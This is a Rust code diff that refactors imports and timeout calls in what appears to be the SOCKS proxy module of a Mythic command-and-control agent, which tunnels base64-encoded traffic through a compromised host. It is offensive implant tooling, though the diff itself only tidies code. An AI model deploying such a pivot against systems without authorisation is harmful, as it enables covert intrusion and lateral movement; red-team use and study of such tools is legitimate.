@@ -66,7 +66,7 @@ fn build_reply(rep: u8, bound: Option<SocketAddr>) -> Vec<u8> {
 }
 
 fn send_socks_packet(
-    tx: &std::mpsc::Sender<serde_json::Value>,
+    tx: &std_mpsc::Sender<serde_json::Value>,
     task_id: &str,
     server_id: &str,
     data: &[u8],
@@ -82,7 +82,7 @@ fn send_socks_packet(
             "task_id": task_id,
             "socks": [{
                 "server_id": sid_json,
-                "data": base64::encode(data),
+                "data": encode(data),
                 "exit": exit
             }]
         }]
@@ -91,7 +91,7 @@ fn send_socks_packet(
 }
 
 fn send_exit_only(
-    tx: &std::mpsc::Sender<serde_json::Value>,
+    tx: &std_mpsc::Sender<serde_json::Value>,
     task_id: &str,
     server_id: &str,
 ) {
@@ -203,7 +203,6 @@ async fn recv_min_bytes(
     mut have: Vec<u8>,
     need: usize,
 ) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
-    use base64::decode;
     while have.len() < need {
         let v = sess_rx.recv().await.ok_or("channel closed before header")?;
         if v.get("exit").and_then(|x| x.as_bool()).unwrap_or(false) {
@@ -230,7 +229,7 @@ async fn run_session(
     parent_task_id: String,
     server_id: String,
     mut sess_rx: tokio::sync::mpsc::UnboundedReceiver<serde_json::Value>,
-    tx_out: std::mpsc::Sender<serde_json::Value>,
+    tx_out: std_mpsc::Sender<serde_json::Value>,
 ) -> Result<(), Box<dyn std::error::Error>> {
     debug_to_mythic(
         &tx_out,
@@ -249,7 +248,7 @@ async fn run_session(
     };
 
     let b64 = first["data"].as_str().unwrap_or("");
-    let decoded = match base64::decode(b64) {
+    let decoded = match decode(b64) {
         Ok(d) => d,
         Err(e) => {
             debug_to_mythic(
@@ -292,7 +291,7 @@ async fn run_session(
     );
 
     // Connect with timeout
-    let remote = match tokio::time::timeout(std::time::Duration::from_secs(15), tokio::net::TcpStream::connect((addr.as_str(), port))).await {
+    let remote = match timeout(Duration::from_secs(15), TcpStream::connect((addr.as_str(), port))).await {
         Ok(Ok(s)) => s,
         Ok(Err(e)) => {
             debug_to_mythic(
@@ -346,7 +345,7 @@ async fn run_session(
     let a2m = tokio::spawn(async move {
         let mut buf = vec![0u8; 16 * 1024];
         loop {
-            match tokio::time::timeout(std::time::Duration::from_secs(300), r_r.read(&mut buf)).await {
+            match timeout(Duration::from_secs(300), r_r.read(&mut buf)).await {
                 Ok(Ok(0)) => {
                     debug_to_mythic(&tx_up, &parent_up, "a2m.eof", format!("server_id={sid_up}"));
                     send_exit_only(&tx_up, &parent_up, &sid_up);
@@ -384,12 +383,12 @@ async fn run_session(
                 break;
             }
             let data_b64 = pkt.get("data").and_then(|v| v.as_str()).unwrap_or("");
-            match base64::decode(data_b64) {
+            match decode(data_b64) {
                 Ok(bytes) => {
                     if bytes.is_empty() {
                         continue;
                     }
-                    let _ = tokio::time::timeout(std::time::Duration::from_secs(60), r_w.write_all(&bytes)).await;
+                    let _ = timeout(Duration::from_secs(60), r_w.write_all(&bytes)).await;
                 }
                 Err(e) => {
                     debug_to_mythic(&tx_dn, &parent_dn, "m2a.b64_err", format!("server_id={sid_dn}; err={e}"));
